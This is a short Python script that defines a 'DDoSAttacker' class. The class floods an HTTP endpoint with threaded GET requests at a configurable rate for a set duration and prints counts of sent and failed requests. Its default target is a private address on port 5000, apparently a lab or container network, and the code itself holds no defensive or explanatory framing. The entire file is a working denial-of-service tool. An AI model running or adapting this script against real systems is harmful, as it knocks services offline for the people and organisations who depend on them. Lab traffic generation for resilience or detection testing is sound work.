import requests
import threading
import time
from datetime import datetime
import sys

class DDoSAttacker:
    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.packets_sent = 0
        self.packets_failed = 0
        self.running = False
        
    def send_request(self):
        try:
            response = requests.get(self.target_url, timeout=1)
            self.packets_sent += 1
            return True
        except:
            self.packets_failed += 1
            return False
    
    def attack_wave(self, num_requests):
        threads = []
        for _ in range(num_requests):
            if not self.running:
                break
            t = threading.Thread(target=self.send_request)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
    
    def run(self, duration=30, requests_per_second=50):
        self.running = True
        start_time = time.time()
        
        print(f"[{datetime.now()}] Starting DDoS attack on {self.target_url}")
        print(f"[{datetime.now()}] Duration: {duration}s, Rate: {requests_per_second} req/s")
        
        while time.time() - start_time < duration and self.running:
            wave_start = time.time()
            self.attack_wave(requests_per_second)
            
            elapsed = time.time() - wave_start
            if elapsed < 1:
                time.sleep(1 - elapsed)
            
            print(f"[{datetime.now()}] Sent: {self.packets_sent}, Failed: {self.packets_failed}")
        
        print(f"[{datetime.now()}] Attack complete. Total: {self.packets_sent} packets")
        self.running = False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    attacker = DDoSAttacker(target)
    attacker.run(duration=20, requests_per_second=100)
